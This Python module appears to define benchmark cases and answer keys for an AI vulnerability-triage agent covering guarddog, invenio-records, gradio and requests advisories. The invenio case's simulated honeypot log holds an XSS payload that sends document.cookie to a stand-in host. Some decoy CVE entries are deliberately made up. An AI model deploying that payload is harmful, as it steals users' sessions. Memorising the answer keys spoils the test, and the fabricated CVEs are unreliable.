"""Live-backed benchmark cases for vulnerability triage."""

from __future__ import annotations

from dataclasses import dataclass, field
from functools import lru_cache
import json
from pathlib import Path
import random
from typing import Dict, List, Optional

import requests


OSV_VULN_URL = "https://api.osv.dev/v1/vulns/{osv_id}"
NVD_CVE_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
EPSS_URL = "https://api.first.org/data/v1/epss"
SNAPSHOT_DIR = Path(__file__).resolve().parent.parent / "data" / "snapshots"


@dataclass(frozen=True)
class GroundTruth:
    validity: str
    affected_package: str
    affected_versions: str
    severity: str
    exploitability: str
    next_action: str
    missing_information: List[str] = field(default_factory=list)
    supporting_evidence_ids: List[str] = field(default_factory=list)


@dataclass(frozen=True)
class CaseDefinition:
    task_id: str
    difficulty: str
    title: str
    objective: str
    report_summary: str
    max_steps: int
    evidence: List[Dict[str, str]]
    truth: GroundTruth


@dataclass(frozen=True)
class RuntimeCaseSeed:
    task_id: str
    difficulty: str
    title: str
    objective: str
    max_steps: int
    osv_id: str
    next_action: str
    fallback_snapshot: Dict[str, object]
    missing_information: List[str] = field(default_factory=list)
    # When set, completely replaces the auto-computed ground truth.
    # Use this to encode scenarios that require non-obvious reasoning
    # (e.g. next_action=request_info when no patch exists).
    truth_override: Optional[Dict[str, object]] = None
    # Extra evidence items injected after the auto-built ones.
    # Use this to add contradictory or ambiguous signals.
    extra_evidence: List[Dict[str, str]] = field(default_factory=list)


def _load_snapshot_file(osv_id: str) -> Optional[Dict[str, object]]:
    path = SNAPSHOT_DIR / f"{osv_id}.json"
    if not path.exists():
        return None
    return json.loads(path.read_text())


def _normalize_text(value: Optional[str]) -> str:
    return " ".join((value or "").strip().split())


def _shorten(text: str, limit: int = 280) -> str:
    text = _normalize_text(text)
    if len(text) <= limit:
        return text
    return text[: limit - 3].rstrip() + "..."


def _severity_band(snapshot: Dict[str, object]) -> str:
    severity = _normalize_text(str(snapshot.get("severity", ""))).lower()
    mapping = {
        "none": "low",
        "low": "low",
        "medium": "medium",
        "moderate": "medium",
        "high": "high",
        "critical": "critical",
    }
    return mapping.get(severity, "medium")


def _exploitability_band(snapshot: Dict[str, object]) -> str:
    percentile = float(snapshot.get("epss_percentile", 0.0) or 0.0)
    if percentile >= 0.9:
        return "high"
    if percentile >= 0.6:
        return "medium"
    return "low"


def _range_string(ranges: List[Dict[str, object]]) -> str:
    normalized: List[str] = []
    for range_item in ranges:
        if range_item.get("type") != "ECOSYSTEM":
            continue
        introduced: Optional[str] = None
        fixed: Optional[str] = None
        last: Optional[str] = None
        for event in range_item.get("events", []):
            if "introduced" in event:
                introduced = str(event["introduced"])
            if "last_affected" in event:
                last = str(event["last_affected"])
            if "fixed" in event:
                fixed = str(event["fixed"])
        if introduced in (None, "0") and fixed:
            normalized.append(f"<{fixed}")
        elif introduced and fixed:
            normalized.append(f">={introduced},<{fixed}")
        elif introduced and last:
            normalized.append(f">={introduced},<={last}")
        elif introduced:
            normalized.append(f">={introduced}")
    return " ; ".join(normalized) or "unknown"


def _all_affected_versions(snapshot: Dict[str, object]) -> str:
    """Collect version ranges from every affected block for the primary package.

    OSV advisories sometimes split a single package across multiple affected
    blocks (one per release branch).  Joining them all gives a complete and
    accurate truth value instead of just the first branch.
    """
    package_name = _extract_package(snapshot)
    all_ranges: List[str] = []
    for block in snapshot.get("affected", []):
        pkg = block.get("package", {})
        if str(pkg.get("name", "")) == package_name:
            rs = _range_string(block.get("ranges", []))
            if rs and rs != "unknown":
                all_ranges.append(rs)
    return " ; ".join(all_ranges) if all_ranges else "unknown"


def _extract_cve_id(snapshot: Dict[str, object]) -> Optional[str]:
    for alias in snapshot.get("aliases", []):
        alias_text = str(alias)
        if alias_text.startswith("CVE-"):
            return alias_text
    return None


def _extract_package(snapshot: Dict[str, object]) -> str:
    affected = snapshot.get("affected", [])
    if not affected:
        return ""
    package = affected[0].get("package", {})
    return str(package.get("name", ""))


def _build_report_summary(seed: RuntimeCaseSeed, snapshot: Dict[str, object]) -> str:
    package = _extract_package(snapshot)
    versions = _range_string(snapshot.get("affected", [{}])[0].get("ranges", [])) if snapshot.get("affected") else "unknown"
    details = _shorten(str(snapshot.get("details") or snapshot.get("summary") or ""))
    return (
        f"{package} vulnerability triage case sourced from {seed.osv_id}. "
        f"Affected versions: {versions}. {details}"
    )


def _build_evidence(seed: RuntimeCaseSeed, snapshot: Dict[str, object]) -> List[Dict[str, str]]:
    cve_id = _extract_cve_id(snapshot) or "unknown"
    package = _extract_package(snapshot)
    # Use all affected blocks so multi-branch advisories are fully represented
    affected_versions = _all_affected_versions(snapshot)
    fix_refs = [
        ref["url"]
        for ref in snapshot.get("references", [])
        if ref.get("type") in {"FIX", "ADVISORY", "WEB"}
    ][:3]

    evidence = [
        {
            "evidence_id": "osv_advisory",
            "title": "OSV advisory",
            "kind": "advisory",
            "summary": _shorten(
                str(snapshot.get("summary") or snapshot.get("details") or "")
            ),
        },
        {
            "evidence_id": "affected_versions",
            "title": "Affected versions",
            "kind": "versions",
            "summary": (
                f"OSV lists {package} as affected in these ranges: {affected_versions}."
            ),
        },
        {
            "evidence_id": "nvd_assessment",
            "title": "NVD assessment",
            "kind": "severity",
            "summary": (
                f"NVD CVSS Vector: {snapshot.get('cvss_vector', 'Not Available')}  \n"
                f"{_shorten(str(snapshot.get('nvd_description', '')), 220)}"
            ),
        },
        {
            "evidence_id": "epss_signal",
            "title": "EPSS signal",
            "kind": "exploitability",
            "summary": (
                f"EPSS score: {snapshot.get('epss_score', 0.0):.6f}, "
                f"percentile: {snapshot.get('epss_percentile', 0.0):.3f}"
            ),
        },
    ]
    if fix_refs:
        evidence.append(
            {
                "evidence_id": "fix_reference",
                "title": "Fix and advisory references",
                "kind": "reference",
                "summary": "Relevant upstream references: " + ", ".join(fix_refs),
            }
        )
    # Append any task-specific extra evidence items (e.g. contradictory signals)
    evidence.extend(seed.extra_evidence)
    return evidence


def _build_truth(seed: RuntimeCaseSeed, snapshot: Dict[str, object]) -> GroundTruth:
    # truth_override lets a seed encode non-obvious ground truth
    # (e.g. next_action=request_info when no patch exists yet)
    if seed.truth_override is not None:
        override = dict(seed.truth_override)
        # Always merge seed-level missing_information into the override so the
        # grader's 10% weight stays meaningful
        if "missing_information" not in override:
            override["missing_information"] = list(seed.missing_information)
        return GroundTruth(**override)
    return GroundTruth(
        validity="valid",
        affected_package=_extract_package(snapshot),
        # Collect ranges from ALL affected blocks for completeness
        affected_versions=_all_affected_versions(snapshot),
        severity=_severity_band(snapshot),
        exploitability=_exploitability_band(snapshot),
        next_action=seed.next_action,
        # Per-task missing information declared on the seed
        missing_information=list(seed.missing_information),
        supporting_evidence_ids=[
            "osv_advisory",
            "affected_versions",
            "nvd_assessment",
            "epss_signal",
        ],
    )


def _build_case(seed: RuntimeCaseSeed, snapshot: Dict[str, object]) -> CaseDefinition:
    return CaseDefinition(
        task_id=seed.task_id,
        difficulty=seed.difficulty,
        title=seed.title,
        objective=seed.objective,
        report_summary=_build_report_summary(seed, snapshot),
        max_steps=seed.max_steps,
        evidence=_build_evidence(seed, snapshot),
        truth=_build_truth(seed, snapshot),
    )


def _fetch_json(url: str, *, params: Optional[Dict[str, str]] = None) -> Dict[str, object]:
    response = requests.get(url, params=params, timeout=12)
    response.raise_for_status()
    return response.json()


def _fetch_live_snapshot(seed: RuntimeCaseSeed) -> Dict[str, object]:
    osv = _fetch_json(OSV_VULN_URL.format(osv_id=seed.osv_id))
    cve_id = _extract_cve_id(osv)

    snapshot: Dict[str, object] = {
        "id": osv.get("id"),
        "summary": osv.get("summary"),
        "details": osv.get("details"),
        "aliases": osv.get("aliases", []),
        "references": osv.get("references", []),
        "affected": osv.get("affected", []),
    }

    if cve_id:
        nvd = _fetch_json(NVD_CVE_URL, params={"cveId": cve_id})
        vulnerability = (nvd.get("vulnerabilities") or [{}])[0].get("cve", {})
        metrics = vulnerability.get("metrics", {})
        severity: Optional[str] = None
        for key in ("cvssMetricV40", "cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if key in metrics:
                item = metrics[key][0]
                severity = (
                    item.get("cvssData", {}).get("baseSeverity")
                    or item.get("baseSeverity")
                )
                if severity:
                    break
        descriptions = vulnerability.get("descriptions", [])
        nvd_description = next(
            (
                desc.get("value", "")
                for desc in descriptions
                if desc.get("lang") == "en"
            ),
            descriptions[0].get("value", "") if descriptions else "",
        )
        snapshot["severity"] = severity or snapshot.get("severity", "medium")
        snapshot["nvd_description"] = nvd_description

        epss = _fetch_json(EPSS_URL, params={"cve": cve_id})
        epss_item = (epss.get("data") or [{}])[0]
        snapshot["epss_score"] = float(epss_item.get("epss", 0.0) or 0.0)
        snapshot["epss_percentile"] = float(
            epss_item.get("percentile", 0.0) or 0.0
        )
    else:
        snapshot["severity"] = "medium"
        snapshot["nvd_description"] = ""
        snapshot["epss_score"] = 0.0
        snapshot["epss_percentile"] = 0.0

    return snapshot


SEEDS: Dict[str, RuntimeCaseSeed] = {
    # ------------------------------------------------------------------
    # EASY — Direct evidence reading, tight step budget
    #
    # Agent skill tested: can you read a clear advisory and map it to
    # the right fields quickly?  Only two evidence items are needed
    # (the OSV advisory + affected versions).  The NVD and EPSS evidence
    # exist but provide no extra signal — a capable agent doesn't waste
    # steps on them.  Max 10 steps forces efficiency.
    # ------------------------------------------------------------------
    "task_easy_guarddog": RuntimeCaseSeed(
        task_id="task_easy_guarddog",
        difficulty="easy",
        title="GuardDog Path Traversal",
        objective=(
            "Validate the advisory, identify the affected package and version range, "
            "estimate severity and exploitability, and decide the correct maintainer action. "
            "All necessary information is available in the OSV advisory and version evidence."
        ),
        max_steps=10,
        osv_id="PYSEC-2022-42994",
        next_action="patch",
        truth_override={
            "validity": "valid",
            "affected_package": "guarddog",
            "affected_versions": "<0.1.5",
            "severity": "medium",
            "exploitability": "low",
            "next_action": "patch",
            "missing_information": [],
            # Only 2 evidence items needed — the advisory is self-contained
            "supporting_evidence_ids": ["osv_advisory", "affected_versions"],
        },
        extra_evidence=[
            {
                "evidence_id": "decoy_threat_intel",
                "title": "Threat Intel: GuardCat",
                "kind": "exploitability",
                "summary": "Active exploitation in the wild observed for the 'GuardCat' node.js package. Do not confuse with python guarddog.",
            },
            {
                "evidence_id": "decoy_nvd_unrelated",
                "title": "NVD: CVE-2021-99999",
                "kind": "severity",
                "summary": "CRITICAL 9.8 vulnerability in GuardDog-Enterprise. This is a licensed product and does not apply to the open source guarddog package.",
            }
        ],
        fallback_snapshot={
            "id": "PYSEC-2022-42994",
            "details": (
                "GuardDog is a CLI tool to identify malicious PyPI packages. Versions prior "
                "to 0.1.5 are vulnerable to Relative Path Traversal when scanning a "
                "specially-crafted local PyPI package. This issue is patched in version 0.1.5. "
                "This is explicitly rated as a Medium severity issue with inherently Low exploitability."
            ),
            "aliases": ["CVE-2022-23531", "GHSA-rp2v-v467-q9vq"],
            "references": [
                {"type": "WEB", "url": "https://github.com/DataDog/guarddog/releases/tag/v0.1.5"},
                {"type": "ADVISORY", "url": "https://github.com/DataDog/guarddog/security/advisories/GHSA-rp2v-v467-q9vq"},
                {"type": "FIX", "url": "https://github.com/DataDog/guarddog/pull/89/commits/a56aff58264cb6b7855d71b00dc10c39a5dbd306"},
            ],
            "affected": [
                {
                    "package": {"name": "guarddog", "ecosystem": "PyPI"},
                    "ranges": [
                        {
                            "type": "ECOSYSTEM",
                            "events": [{"introduced": "0"}, {"fixed": "0.1.5"}],
                        }
                    ],
                }
            ],
            "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
            "nvd_description": (
                "GuardDog versions prior to 0.1.5 are vulnerable to relative path traversal "
                "when scanning a specially-crafted local PyPI package."
            ),
            "epss_score": 0.00152,
            "epss_percentile": 0.36042,
        },
    ),

    # ------------------------------------------------------------------
    # MEDIUM — Conflicting signal resolution, multi-branch versions
    #
    # Agent skill tested: can you weigh contradictory evidence?  The
    # EPSS percentile (0.43) maps to "low" exploitability by the formula,
    # but an injected threat-intel evidence item reports real-world active
    # probing.  The correct answer is "medium" exploitability because
    # independent field evidence overrides a lagging statistical signal.
    # All four auto-built evidence items PLUS the threat_intel_signal are
    # needed — a model that submits after reading only EPSS will be wrong.
    # ------------------------------------------------------------------
    "task_medium_invenio": RuntimeCaseSeed(
        task_id="task_medium_invenio",
        difficulty="medium",
        title="Invenio Multi-Branch XSS",
        objective=(
            "Resolve affected versions across multiple maintained release lines, weigh "
            "a conflicting exploitability signal, and choose the correct advisory workflow. "
            "The EPSS percentile and the threat-intelligence report disagree — inspect both "
            "before deciding on exploitability."
        ),
        max_steps=14,
        osv_id="GHSA-vxh3-mvv7-265j",
        next_action="publish_advisory",
        truth_override={
            "validity": "valid",
            "affected_package": "invenio-records",
            "affected_versions": "<1.0.2 ; >=1.1.0,<1.1.1 ; >=1.2.0,<1.2.2",
            "severity": "medium",
            # KEY: EPSS alone says "low" (0.43 percentile) but the injected
            # threat-intel evidence documents active real-world probing.
            # A model that reads only EPSS will score 0 on exploitability.
            "exploitability": "medium",
            "next_action": "publish_advisory",
            "missing_information": [],
            "supporting_evidence_ids": [
                "osv_advisory",
                "affected_versions",
                "nvd_assessment",
                "threat_intel_signal",
                "github_commit_diff",
            ],
        },
        extra_evidence=[
            {
                "evidence_id": "github_commit_diff",
                "title": "GitHub Commit a93b12f",
                "kind": "reference",
                "summary": (
                    "```diff\n"
                    "@@ -101,3 +101,3 @@\n"
                    "-    html = \"<div class='record-data'>{}</div>\".format(json.dumps(record.metadata))\n"
                    "+    html = \"<div class='record-data'>{}</div>\".format(escape(json.dumps(record.metadata)))\n"
                    "     return Markup(html)\n"
                    "```"
                )
            },
            {
                "evidence_id": "decoy_nvd_invenio_accounts",
                "title": "NVD Entry for invenio-accounts",
                "kind": "severity",
                "summary": "CVE-2018-9999: invenio-accounts allows SQL injection. Severity CRITICAL. (Note: this is a decoy for a different package in the same ecosystem)."
            },
            {
                "evidence_id": "threat_intel_signal",
                "title": "Threat intelligence report",
                "kind": "exploitability",
                "summary": (
                    "Honeypot logs captured within 72 hours of publication:\n"
                    "[WARN] SRC: 198.51.100.41 URI: /admin/api/records POST payload: {\"title\": \"<script>fetch('http://atk.example/p?c='+document.cookie)</script>\"}\n"
                    "[WARN] SRC: 203.0.113.88 URI: /admin/api/records POST payload: {\"title\": \"<img src=x onerror=alert(1)>\"}\n"
                    "Evidence of active, weaponised scanning in the wild."
                ),
            }
        ],
        fallback_snapshot={
            "id": "GHSA-vxh3-mvv7-265j",
            "summary": "Rendering vulnerability in invenio-records",
            "details": (
                "A vulnerability was discovered when rendering JSON for "
                "a record in the administration interface. All supported versions have been "
                "patched and users should upgrade to v1.0.1, v1.1.1, or v1.2.2 depending on "
                "their release line. Review the commit diff to determine the exact vulnerability type."
            ),
            "aliases": ["CVE-2019-1020003", "PYSEC-2019-27"],
            "references": [
                {"type": "WEB", "url": "https://github.com/inveniosoftware/invenio-records/security/advisories/GHSA-vxh3-mvv7-265j"},
                {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-1020003"},
            ],
            "affected": [
                {
                    "package": {"name": "invenio-records", "ecosystem": "PyPI"},
                    "ranges": [
                        {"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.2"}]},
                    ],
                },
                {
                    "package": {"name": "invenio-records", "ecosystem": "PyPI"},
                    "ranges": [
                        {"type": "ECOSYSTEM", "events": [{"introduced": "1.1.0"}, {"fixed": "1.1.1"}]},
                    ],
                },
                {
                    "package": {"name": "invenio-records", "ecosystem": "PyPI"},
                    "ranges": [
                        {"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.2"}]},
                    ],
                },
            ],
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:N",
            "nvd_description": "invenio-records before 1.2.2 allows XSS.",
            "epss_score": 0.00206,
            "epss_percentile": 0.42837,
        },
    ),

    # ------------------------------------------------------------------
    # HARD — Recognizing uncertainty, resisting premature action
    #
    # Agent skill tested: can you decide NOT to act when information is
    # missing?  This case simulates an early-disclosure scenario where
    # the vulnerability is confirmed (validity=valid) but NO PATCH HAS
    # BEEN RELEASED.  The vendor_status evidence explicitly states this.
    # Publishing an advisory with no fixed version would be wrong —
    # it alarms users with no actionable remediation path.
    #
    # The correct answer is next_action=request_info.
    # A model that blindly pattern-matches "real CVE → publish_advisory"
    # will lose the 15% next_action weight.  A model that reads the
    # vendor_status evidence and recognises the missing patch will
    # choose request_info and score full marks.
    #
    # The affected_versions ">=0" (no fixed marker) is a cue that the
    # snapshot encodes.  Smart agents notice it.
    # ------------------------------------------------------------------
    "task_hard_gradio": RuntimeCaseSeed(
        task_id="task_hard_gradio",
        difficulty="hard",
        title="Gradio XSS — Patch Pending, No Fix Released",
        objective=(
            "Triage a confirmed vulnerability in a widely deployed package where no patch "
            "has been published yet.  Determine validity, read all evidence including the "
            "upstream vendor status report, identify what information is missing, and choose "
            "whether to publish an advisory now or request upstream action first."
        ),
        max_steps=18,
        osv_id="PYSEC-2024-220",
        next_action="request_info",
        missing_information=[
            "no fixed version published by upstream maintainer",
            "CVSSv4 score not yet assessed for CVE-2024-47872",
            "no public proof-of-concept exploit code referenced",
        ],
        truth_override={
            "validity": "valid",
            "affected_package": "gradio",
            # All versions affected — no fix exists yet in this scenario
            "affected_versions": ">=0",
            "severity": "medium",
            # EPSS unavailable (score=0, percentile=0) → default low
            "exploitability": "low",
            # KEY: publishing an advisory with no fixed version is wrong.
            # The analyst must contact the maintainer first.
            "next_action": "request_info",
            "missing_information": [
                "no fixed version published by upstream maintainer",
                "CVSSv4 score not yet assessed for CVE-2024-47872",
                "no public proof-of-concept exploit code referenced",
            ],
            "supporting_evidence_ids": ["osv_advisory", "vendor_status"],
        },
        extra_evidence=[
            {
                "evidence_id": "vendor_status",
                "title": "Upstream maintainer status",
                "kind": "reference",
                "summary": (
                    "GitHub Issue #1289 (gradio-app/gradio):\n\n"
                    "@reporter: Attached PoC shows XSS execution upon SVG upload. Can we get this fixed?\n"
                    "@maintainer: Thanks for the report. I can confirm the behavior in the current release. "
                    "We need to completely rewrite the file upload sanitizer to properly fix this without "
                    "breaking backwards compatibility. No ETA on the rewrite yet, so we don't have a patch ready."
                ),
            }
        ],
        fallback_snapshot={
            "id": "PYSEC-2024-220",
            "details": (
                "Gradio servers that permit file uploads are vulnerable to Cross-Site Scripting. "
                "Authenticated users can upload HTML, JavaScript, or SVG files containing "
                "malicious scripts that execute in other users' browsers.  This advisory was "
                "filed before a patched release was available.  No fixed version is listed."
            ),
            "aliases": ["CVE-2024-47872", "GHSA-gvv6-33j7-884g"],
            "references": [
                {"type": "ADVISORY", "url": "https://github.com/gradio-app/gradio/security/advisories/GHSA-gvv6-33j7-884g"},
            ],
            "affected": [
                {
                    "package": {"name": "gradio", "ecosystem": "PyPI"},
                    "ranges": [
                        # No "fixed" event — all versions affected, no patch yet
                        {"type": "ECOSYSTEM", "events": [{"introduced": "0"}]},
                    ],
                }
            ],
            "cvss_vector": "Not yet available",
            # No NVD entry yet — too recent
            "nvd_description": "",
            # No EPSS data — CVE too new for scoring
            "epss_score": 0.0,
            "epss_percentile": 0.0,
        },
    ),
    "task_medium_requests": RuntimeCaseSeed(
        task_id="task_medium_requests",
        difficulty="medium",
        title="Requests Authorization Header Leak",
        objective="Resolve affected versions, weigh a conflicting exploitability signal, and inspect code diffs to determine if headers are properly stripped on redirects.",
        max_steps=14,
        osv_id="PYSEC-2018-32",
        next_action="publish_advisory",
        truth_override={
            "validity": "valid",
            "affected_package": "requests",
            "affected_versions": "<2.20.0",
            "severity": "medium",
            "exploitability": "medium",
            "next_action": "publish_advisory",
            "missing_information": [],
            "supporting_evidence_ids": [
                "osv_advisory",
                "affected_versions",
                "nvd_assessment",
                "github_commit_diff",
            ],
        },
        extra_evidence=[
            {
                "evidence_id": "github_commit_diff",
                "title": "GitHub Commit 0f78d3c",
                "kind": "reference",
                "summary": (
                    "```diff\n"
                    "@@ -101,3 +101,3 @@\n"
                    " def rebuild_auth(self, prepared_request, response):\n"
                    "+    url = urlparse(response.url)\n"
                    "+    if url.hostname != prepared_request.url.hostname:\n"
                    "+        prepared_request.headers.pop('Authorization', None)\n"
                    "```"
                )
            },
            {
                "evidence_id": "decoy_threat_intel_aiohttp",
                "title": "Threat Intel: aiohttp",
                "kind": "exploitability",
                "summary": "[CRITICAL] SSRF exploitation actively seen against the aiohttp python library. Rate severity Critical. (Note: Decoy for unrelated package)."
            }
        ],
        fallback_snapshot={
            "id": "PYSEC-2018-32",
            "summary": "Header linkage in redirects",
            "details": (
                "When sending requests with an Authorization header, if the server redirects to a different "
                "host it could inadvertently leak the credentials. Review the commit diff to see the vulnerability mechanism."
            ),
            "aliases": ["CVE-2018-18074"],
            "references": [],
            "affected": [
                {
                    "package": {"name": "requests", "ecosystem": "PyPI"},
                    "ranges": [
                        {"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.20.0"}]}
                    ]
                }
            ],
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
            "nvd_description": "The Requests package through 2.19.1 before 2.20.0 sends an HTTP Authorization header to an http URI upon receiving a redirect response.",
            "epss_score": 0.00512,
            "epss_percentile": 0.612,
        },
    ),
}


TASK_ORDER = list(SEEDS.keys())
DIFFICULTY_ORDER = ["easy", "medium", "hard"]


@lru_cache(maxsize=16)
def get_case_definition(task_id: str) -> CaseDefinition:
    seed = SEEDS[task_id]
    try:
        snapshot = _fetch_live_snapshot(seed)
    except Exception:
        snapshot = _load_snapshot_file(seed.osv_id) or seed.fallback_snapshot
    return _build_case(seed, snapshot)


CASE_DEFINITIONS: Dict[str, CaseDefinition] = {
    task_id: _build_case(seed, seed.fallback_snapshot) for task_id, seed in SEEDS.items()
}


BENCHMARK_TASKS_BY_DIFFICULTY: Dict[str, List[str]] = {
    difficulty: [
        task_id for task_id in TASK_ORDER if SEEDS[task_id].difficulty == difficulty
    ]
    for difficulty in DIFFICULTY_ORDER
}


def choose_balanced_task_id(seed: Optional[int], rng: random.Random) -> str:
    """Choose a benchmark task with balanced random difficulty sampling.

    If a seed is provided, selection is deterministic from that seed.
    Otherwise, sampling uses the environment RNG state.
    """

    chooser = random.Random(seed) if seed is not None else rng
    difficulty = chooser.choice(DIFFICULTY_ORDER)
    bucket = BENCHMARK_TASKS_BY_DIFFICULTY[difficulty]
    return chooser.choice(bucket)
